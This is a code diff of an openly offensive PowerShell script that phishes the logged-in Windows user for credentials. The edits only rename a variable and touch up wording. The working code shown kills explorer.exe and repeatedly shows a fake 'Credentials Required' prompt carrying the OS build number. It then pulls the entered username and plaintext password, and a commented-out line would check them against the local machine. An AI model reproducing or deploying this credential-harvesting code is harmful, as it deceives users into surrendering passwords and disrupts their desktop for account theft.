@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-Standalone Powershell script that will promp the current user for a valid credentials.
+  Standalone Powershell script that will promp the current user for a valid credential.
 
 .Author: @enigma0x3 &('r00t-3xp10it')
    Required Dependencies: None
@@ -23,7 +23,7 @@ Standalone Powershell script that will promp the current user for a valid creden
 #>
 
 
-$OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
+$OSBuild = (Get-WmiObject Win32_OperatingSystem).Version
 taskkill /f /im explorer.exe
 $timestomp = $null
 $account = $null
@@ -40,8 +40,8 @@ while ($counter -lt '1000000000')
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("Build: $OSVersion - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
-  #$validate = $DS.ValidateCredentials($Account, $credential.GetNetworkCredential().password)
+  $credential = $host.ui.PromptForCredential("Build: $OSBuild - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
+  #$validate = $DS.ValidateCredentials($account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
     $pass = $credential.GetNetworkCredential().password;
